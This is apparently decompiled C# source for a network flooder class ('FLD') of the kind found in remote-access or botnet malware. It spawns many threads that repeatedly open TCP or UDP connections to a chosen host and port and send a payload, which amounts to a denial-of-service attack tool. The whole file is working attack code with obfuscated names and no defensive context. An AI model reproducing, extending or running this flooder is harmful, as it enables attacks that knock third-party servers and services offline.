using System;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace n;

public class FLD
{
	public byte[] pk;

	public string HOST;

	public int Port;

	public int Count;

	private int ALV;

	public FLD()
	{
		pk = new byte[1];
		ALV = 0;
	}

	public void Start(ref bool TCP)
	{
		checked
		{
			Thread[] array = new Thread[Count + 1];
			int num2 = default(int);
			do
			{
				Thread.Sleep(1);
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if ((array[i] == null) & (ALV < 100))
					{
						if (TCP)
						{
							array[i] = new Thread(this.TCP);
						}
						else
						{
							array[i] = new Thread(UDP);
						}
						array[i].Start();
					}
					else
					{
						num2++;
					}
				}
			}
			while (num2 != array.Length);
		}
	}

	public void UDP()
	{
		byte[] array = new byte[0];
		array = pk;
		try
		{
			UdpClient udpClient = new UdpClient();
			udpClient.Client.Connect(HOST, Port);
			udpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			goto IL_0086;
		}
		UdpClient udpClient2 = new UdpClient();
		try
		{
			udpClient2.Connect(HOST, Port);
			udpClient2.Client.SendTimeout = -1;
			udpClient2.Client.Send(array, array.Length, SocketFlags.None);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		goto IL_0086;
		IL_0086:
		checked
		{
			ALV += -1;
		}
	}

	public void TCP()
	{
		byte[] array = new byte[0];
		array = pk;
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Client.Connect(HOST, Port);
			tcpClient.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			goto IL_008a;
		}
		TcpClient tcpClient2 = new TcpClient();
		try
		{
			tcpClient2.Connect(HOST, Port);
			tcpClient2.Client.SendTimeout = 500;
			tcpClient2.Client.Send(array, array.Length, SocketFlags.None);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		goto IL_008a;
		IL_008a:
		checked
		{
			ALV += -1;
		}
	}
}
